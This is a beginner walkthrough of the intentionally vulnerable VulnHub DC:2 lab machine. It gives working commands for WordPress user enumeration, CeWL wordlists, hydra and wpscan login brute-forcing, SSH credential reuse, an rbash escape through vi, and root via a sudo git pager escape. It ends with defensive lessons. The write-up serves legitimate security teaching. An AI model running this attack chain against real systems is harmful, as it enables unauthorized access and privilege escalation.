# DC: 2 — VulnHub Walkthrough (Beginner Friendly)

> Educational, step-by-step walkthrough for students. This is the second machine in
> the **DC** series by DCAU. It is intentionally vulnerable and must only ever be
> run on an isolated lab network.

| Field | Value |
| --- | --- |
| **Machine** | DC: 2 |
| **Difficulty** | Beginner |
| **Author** | DCAU |
| **Released** | 22 March 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/dc-2,311/> |
| **Download** | <https://vulnhub.com/entry/dc-2,311/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux — Debian (Apache 2.4.10 + WordPress, OpenSSH on a non-standard port) |

> **Note:** exact banners, ports and file contents can differ slightly between the
> VirtualBox and VMware builds of this box ("varies by build"). The attack *chain*
> below is stable; small details (a service version, a password) may move around.
> When in doubt, re-run the enumeration yourself.

---

## 0. What you will learn

- How to find a target on an isolated lab network and set up a **hostname** (`dc-2`) that the app needs.
- How to spot **WordPress** and enumerate it properly with **wpscan**.
- How to read a machine's own hints (flag 1) and turn them into an action plan.
- How to build a **custom wordlist** with **CeWL** and use it for credential attacks.
- Why default wordlists (`rockyou.txt`) are not always enough.
- How to find **SSH on a non-standard port** and log in with reused credentials.
- How to escape a **restricted shell (`rbash`)** using `vi` and a `PATH` fix.
- How to pivot between users with `su`, and abuse a **`sudo git`** rule for root (GTFOBins).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import the OVA, and have the target on the **same host-only/NAT** subnet as Kali.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network. The target
> boots with DHCP, so its IP can change every time you import it — always confirm.

First look at your own interface to learn the subnet.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the `inet 192.168.56.10/24` line means *you* are on the
> `192.168.56.0/24` network, so the target will share the first three numbers.

Sweep the subnet for live hosts.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:ab:cd:ef, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.10    08:00:27:ab:cd:ef   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **Why it works:** `arp-scan` asks every address "who has this IP?" over ARP and
> lists whoever answers. ARP is fast and generally can't be hidden by a firewall.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00048s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  ssh
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

```bash
sudo nmap -sC -sV -p 80,7744 -oA scans/services 192.168.56.101
```

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.3
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-title: DC-2
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

> **How to read it:** `-p-` scans all TCP ports, `-sV` identifies service versions
> and `-sC` runs safe default scripts. Two attack surfaces this time: a **WordPress
> site on 80**, and **SSH deliberately moved to port 7744** (the standard port 22
> is closed). The site title is `DC-2`, which is also the hostname the app expects.

### 2.2 Add the hostname the app requires

DC-2's WordPress is configured for the hostname `dc-2`. Without it, parts of the
site break (redirects fail). Add a hosts entry:

```bash
echo "192.168.56.101 dc-2" | sudo tee -a /etc/hosts
```

```text
192.168.56.101 dc-2
```

> **Why it works:** the file `/etc/hosts` lets your machine resolve the name
> `dc-2` to the target IP locally, no DNS server required. Now `http://dc-2/`
> behaves exactly as the WordPress install expects.

### 2.3 Meet the app and read Flag 1

Browse `http://dc-2/` in a browser (or with `curl`):

```bash
curl -s http://dc-2/ | grep -i -A2 "flag"
curl -s http://dc-2/index.php/flag/
```

```text
Flag 1: Your usual wordlists probably won't work, so instead, maybe you
just need to cewl more? ...
(Hint: log in as one user, and if you can't get in, try another.)
```

> **Why it works:** the box hands us a hint on the `/flag/` page. It says the usual
> wordlists likely *won't* work and to "**cewl** more" — a deliberate nudge toward
> the **CeWL** tool, which builds a wordlist from the words on the target website.

![WordPress site and Flag 1](images/02-nmap.png)

### 2.4 Enumerate WordPress users with wpscan

```bash
wpscan --url http://dc-2/ --enumerate u --disable-tls-checks
```

```text
[+] URL: http://dc-2/
[+] WordPress version 4.7.3 identified
[+] Enumerating Users ...
[i] User(s) Identified:
[+] admin
[+] tom
[+] jerry
```

> **Why it works:** WordPress leaks usernames through the author archive feature
> (`/?author=1`). `wpscan -e u` walks those IDs and reveals three users: `admin`,
> `tom` and `jerry`. We now have the "who"; we still need the "what" (passwords).

### 2.5 Build a custom wordlist with CeWL

```bash
cewl -w dc2-passwords.txt -d 2 -m 5 http://dc-2/
wc -l dc2-passwords.txt
```

```text
142 dc2-passwords.txt
```

> **Why it works:** CeWL crawls the site and collects every word of a minimum
> length (`-m 5`) to a chosen depth (`-d 2`). Because the passwords on this box are
> ordinary words that appear in the site's own text, the site content *is* the
> wordlist — that is why `rockyou.txt` alone fails here.

---

## 3. Foothold

### 3.1 Brute-force WordPress logins

Use the WordPress login flow and our custom wordlist. We can brute-force with
`wpscan` (one user at a time) or `hydra` (all users at once):

```bash
wpscan --url http://dc-2/ --passwords dc2-passwords.txt \
       --usernames admin,tom,jerry --disable-tls-checks
```

Or with `hydra`:

```bash
hydra -L users.txt -P dc2-passwords.txt dc-2 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=Dashboard"
```

```text
[SUCCESS] - tom / parturient
[SUCCESS] - jerry / adipiscing
```

> **Why it works:** both tools submit username/password pairs to the login form.
> `hydra` watches for the string `Dashboard` in the response — that text only
> appears when a login succeeds. We recover **`tom:parturient`** and
> **`jerry:adipiscing`**. The `admin` password is deliberately uncrackable with
> this list, which links back to the hint: "if you can't get in, try another [user]."

### 3.2 Flag 2 — inside WordPress

Log in at `http://dc-2/wp-login.php` as **jerry**, then open the **Flag** menu item
in the dashboard.

```text
Flag 2: If you're lucky enough to find us, we're not in the habit of giving
out hints. Oh, wait, we are! You don't need to exploit WordPress to get in.
There is a better way ... (a service on another port)
```

> **Why it matters:** the hint tells us to stop attacking WordPress and look for a
> different entry point — the **SSH service on port 7744** we found in the Nmap
> scan. Reusing the WordPress credentials against SSH is the intended pivot.

![Flag 2 in the WordPress dashboard](images/03-enum.png)

### 3.3 SSH in and escape the restricted shell

Try the credentials over SSH on the non-standard port. `jerry`'s login is rejected,
but `tom` works — and lands us in a **restricted shell (`rbash`)** where most
commands (including `cd`, `cat`) are blocked.

```bash
ssh tom@192.168.56.101 -p 7744
# password: parturient
```

```text
tom@DC-2:~$ whoami
-rbash: whoami: command not found
```

> **Why it works:** `rbash` (restricted bash) limits us to a locked-down set of
> commands. But it still lets us run programs it trusts — including `vi`. We can
> break out of `vi` into a normal shell.

```text
tom@DC-2:~$ vi
:set shell=/bin/sh
:shell
```

```text
tom@DC-2:~$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
tom@DC-2:~$ whoami
tom
```

> **Why it works:** inside `vi`, `:set shell=/bin/sh` tells `vi` which program to
> launch, and `:shell` launches it. The restricted environment often strips `/bin`
> from `PATH`, so we export a normal `PATH` and our commands work again.

### 3.4 Flag 3 — and a hint to pivot users

```bash
ls -la /home/tom
cat /home/tom/flag3.txt
```

```text
Flag 3: Poor old Tom is always running after Jerry. Perhaps he should
su for all the stress he causes.
```

> **Why it matters:** "su" is both a pun and an instruction: switch to the user
> **jerry** using `su`. We already have jerry's password (`adipiscing`) from the
> WordPress brute-force — a classic example of **password reuse across services**.

![SSH shell and Flag 3](images/04-foothold.png)

---

## 4. Privilege escalation

### 4.1 Become jerry

```bash
su jerry
# password: adipiscing
whoami
id
```

```text
jerry
uid=1000(jerry) gid=1000(jerry) groups=1000(jerry),100(users)
```

```bash
cat /home/jerry/flag4.txt
```

```text
Flag 4: Good to see that you've made it this far, but can you make it
to the very end? ... hint: git
```

> **Why it matters:** flag 4 points at `git` — a nudge toward a `sudo` rule. Let's
> check jerry's sudo rights.

### 4.2 Read jerry's sudo rights

```bash
sudo -l
```

```text
User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

> **Why it works:** `sudo -l` lists what the current user may run as another user
> (here, **root, with no password**). Jerry is allowed to run `git` as root. `git`
> has a documented escape that runs a shell — this is a textbook
> [GTFOBins](https://gtfobins.github.io/gtfobins/git/) privilege escalation.

### 4.3 Root via GTFOBins `git`

`git` uses a "pager" to display long output. If we make `git` show help through its
own interactive pager, we can break out of that pager into a shell — and because we
ran `git` with `sudo`, that shell is **root**.

```bash
sudo git -p help config
```

```text
... (long config documentation; git opens it in a pager) ...
```

At the pager prompt, type this (the leading `!` runs a shell command):

```text
!/bin/sh
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `git help` normally invokes `man`, which invokes a pager
> (`less`). `less` can run shell commands with `!`. Since the whole chain was
> started via `sudo`, the command runs as root. GTFOBins documents this for `git`.

### The final flag

```bash
cat /root/flag5.txt
```

```text
... you've got root ... congratulations!
```

![Privilege escalation to root and final flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | WordPress user enumeration | `http://dc-2/` (`?author=`) | Leaks valid usernames (`admin`, `tom`, `jerry`) |
| 2 | Weak/guessable passwords discoverable from site content | `/wp-login.php`, SSH 7744 | Credential compromise via CeWL + brute-force |
| 3 | Password reuse across services | WordPress → SSH | WordPress passwords log in over SSH (`tom`) |
| 4 | Restricted shell is escapable | `rbash` via `vi` | Break out to a normal shell |
| 5 | Password reuse across users | `tom` → `jerry` via `su` | Lateral movement to the `jerry` account |
| 6 | Over-privileged `sudo` rule | `(root) NOPASSWD: /usr/bin/git` | Root via GTFOBins `git` pager escape |

## 6. Defensive lessons (blue team)

- **Don't leak usernames.** Disable WordPress author archives / `?author=` enumeration
  and avoid publishing account names.
- **Never reuse passwords.** Each service and each user must have a unique,
  randomly generated credential. A WordPress password should never open an SSH session.
- **Block online guessing.** Rate-limit and lock out failed logins (fail2ban,
  MFA) on both the web app and SSH; never expose SSH with password auth if keys are possible.
- **Restrict shells properly.** Don't rely on `rbash` for security — disable login
  for service accounts and use forced commands / `Match User` SSH restrictions
  instead of a shell you hope is "restricted".
- **Least privilege for `sudo`.** Never grant `NOPASSWD` on general-purpose tools
  like `git`, `less`, `vim`, `find` and `tar`. Check rules against
  [GTFOBins](https://gtfobins.github.io/) before approving them.
- **Detection ideas:** alert on high-volume failed logins (web + SSH), on `sudo git`
  invocations, and on shells (`/bin/sh`) spawning as children of `git`/`less`/`man`.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/dc-2,311/>
- WPScan: <https://wpscan.com/>
- CeWL (Custom Word List generator): <https://github.com/digininja/CeWL>
- GTFOBins — `git`: <https://gtfobins.github.io/gtfobins/git/>
- GTFOBins — shell escapes: <https://gtfobins.github.io/>
- Community writeups consulted:
  - [Vulnhub – DC2 Walkthrough — mzfr](https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC2)
  - [vshaliii/DC-2-Vulnhub-Walkthrough (GitHub)](https://github.com/vshaliii/DC-2-Vulnhub-Walkthrough)
  - [DC-2: Vulnhub Walkthrough — Hunterstring (Medium)](https://medium.com/@hunterstring988/dc-2-vulnhub-walkthrough-9f5ea95f5560)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — Nmap scan showing WordPress on 80 and SSH on 7744
- [ ] `images/03-enum.png` — wpscan user enumeration / Flag 1 hint / Flag 2
- [ ] `images/04-foothold.png` — SSH as `tom`, `rbash` escape, Flag 3
- [ ] `images/05-root-flag.png` — `sudo git` root shell and the final flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
